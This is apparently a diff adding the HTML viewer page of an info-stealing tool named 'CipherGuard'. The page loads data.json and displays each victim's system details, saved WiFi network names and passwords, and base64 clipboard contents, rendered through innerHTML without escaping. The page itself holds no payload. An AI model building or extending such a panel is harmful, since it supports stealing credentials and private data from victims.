@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+    integrity="sha512-..." crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter+Tight:wght@300;400;500;600;700;800;900&family=Inter:wght@200;300;400;500;600;700;800;900&family=Lora:wght@400;500;600;700&family=Poppins:wght@200;300;400;500;600;700;800;900&family=Open+Sans:wght@300;400;500;600;700;800&family=Raleway:wght@300;400;500;600;700;800;900&family=Secular+One&display=swap');
+
+    :root {
+      font-family: "Inter", system-ui, Avenir, Helvetica, Arial, sans-serif;
+      line-height: 1.5;
+      font-weight: 400;
+
+      /* color-scheme: light dark; */
+      color: white;
+      /* background-color: #242424; */
+      background-color: #0b1120;
+
+      font-synthesis: none;
+      text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-text-size-adjust: 100%;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      list-style: none;
+      text-decoration: none;
+      box-sizing: border-box;
+      outline: 0;
+      margin: 0;
+      padding: 0;
+      font-family: "Inter", system-ui, Avenir, Helvetica, Arial, sans-serif;
+    }
+
+    button {
+      font-size: 14px !important;
+      padding: .5rem 1rem !important;
+      border-radius: 4px;
+      display: flex;
+      cursor: pointer;
+      align-items: center;
+      border: 1px solid transparent;
+      transition: all .2s ease-in;
+      line-height: 1;
+      font-family: Inter, system-ui, Avenir, Helvetica, Arial, sans-serif;
+    }
+
+    button.light {
+      color: white;
+      background: linear-gradient(to top right, #255efc, #1caef1);
+    }
+
+    /* CSS Styling */
+    .data-item {
+      margin: 20px;
+      padding: 20px;
+      background-color: #1e2741;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      transition: transform 0.2s;
+    }
+
+    .data-item:hover {
+      transform: scale(1.02);
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #f0f0f0;
+    }
+
+    .sysinfo,
+    .wifi-info,
+    .clipboard-info {
+      margin-top: 15px;
+    }
+
+    .label {
+      font-weight: bold;
+      color: #00aaff;
+    }
+
+    .no-info {
+      color: #ff5555;
+      font-style: italic;
+    }
+
+    .wifi-info li {
+      margin: 5px 0;
+    }
+
+    .clipboard-info {
+      font-family: "Inter", system-ui, Avenir, Helvetica, Arial, sans-serif;
+      font-size: 16px;
+      font-weight: 500;
+      overflow-x: auto;
+    }
+
+    .clipboard-info pre{
+      background-color: #f0f0f0;
+      padding: 10px;
+      margin-top: .35rem;
+      color: #0b1120;
+      border-radius: 4px;
+    }
+
+    /* Container Styling */
+    #data-container {
+      justify-content: center;
+      padding: .5rem 10rem;
+    }
+
+    /* Navigation Bar Styling */
+    nav {
+      background-color: #0b1120;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    #name {
+      font-family: "Lora";
+      font-size: 20px;
+      font-weight: 800;
+    }
+
+    button {
+      font-size: 14px !important;
+      padding: .5rem 1rem !important;
+      border-radius: 4px;
+      display: flex;
+      cursor: pointer;
+      align-items: center;
+      border: none;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    button.light {
+      color: white;
+      background: linear-gradient(to top right, #255efc, #1caef1);
+    }
+
+    button:hover {
+      background-color: #255efc;
+      color: white;
+    }
+
+    .fas {
+      margin-right: .5rem;
+    }
+
+    .wifiLi {
+      width: 100%;
+      display: flex;
+    }
+
+    .di-con {
+      width: 100%;
+      display: flex;
+    }
+
+    .di-con .dc-1 {
+      width: 50%;
+    }
+
+    .di-con .dc-2 {
+      width: 50%;
+    }
+
+    h3 {
+      padding-bottom: .25rem;
+    }
+
+    h2 {
+      font-size: 1.5rem !important;
+      font-weight: 500 !important;
+      padding-bottom: .5rem;
+    border-bottom: 1px solid #ffffff36;
+    margin-bottom: .5rem !important;
+    }
+    
+  </style>
+</head>
+
+<body>
+  <nav class="flex justify-between items-center h-20 px-20 border-0 border-b border-[#f7f7f70a]">
+    <div class='flex items-center'>
+      <div id="name">CipherGuard</div>
+    </div>
+  </nav>
+  <div id="data-container">
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const fetchData = async () => {
+        try {
+          const reqData = await fetch('data.json');
+          const data = await reqData.json();
+          return data;
+        } catch (error) {
+          console.error('Error fetching data:', error);
+          return null;
+        }
+      };
+
+      const displayData = async () => {
+        const data = await fetchData();
+        if (data) {
+          const dataContainer = document.getElementById("data-container");
+          Object.keys(data).forEach((key) => {
+            const item = data[key];
+            console.log(item)
+            const div = document.createElement("div");
+            div.classList.add("data-item");
+
+            div.innerHTML = `
+        <h2>${key}</h2>
+        <div class="di-con">
+        <div class="dc-1">
+        <div class="sysinfo">
+          <h3><i class='fas fa-desktop'></i>System Info</h3>
+          ${Object.keys(item.sysinfo).length === 0 ? "<p class='no-info'>No System Info Captured</p>" :
+                `
+          <p>Home Directory: ${item.sysinfo['Home Directory']}</p>
+          <p>System: ${item.sysinfo.System}</p>
+          <p>Node Name: ${item.sysinfo['Node Name']}</p>
+          <p>Release: ${item.sysinfo.Release}</p>
+          <p>Version: ${item.sysinfo.Version}</p>
+          <p>Machine: ${item.sysinfo.Machine}</p>
+          <p>Processor: ${item.sysinfo.Processor}</p>`}
+        </div>
+        <ul class="wifi-info">
+          <h3><i class='fas fa-wifi'></i>WiFi Info</h3>
+          ${item.show_wifi.length === 0 ? "<p class='no-info'>No WIFI Keys & Passwords Info Captured</p>" :
+                item.show_wifi.map((wifi) => `
+            <li class="wifiLi"><span>[ ] ${wifi.SSID}</span>&nbsp;-->&nbsp;<span>${wifi.Password}</span></li>
+          `).join('')}
+        </ul>
+      </div>
+        <div class="clipboard-info dc-2">
+          <div style="display: flex; justify-content: space-between;"><h3><i class='fas fa-clipboard'></i>Clipboard Info </h3><a href="https://www.base64decode.org/" target=_blank>Open Decoder</a></div>
+          <pre>${item.cp_clipb === "" ? "<p class='no-info'>No Clipboard Information Captured</p>" : item.cp_clipb}</pre>
+        </div>
+      </div>
+      `;
+            dataContainer.appendChild(div);
+          });
+        }
+      };
+
+      // Call the displayData function to populate the data-container
+      displayData();
+    });
+
+  </script>
+
+
+</body>
+
+</html>
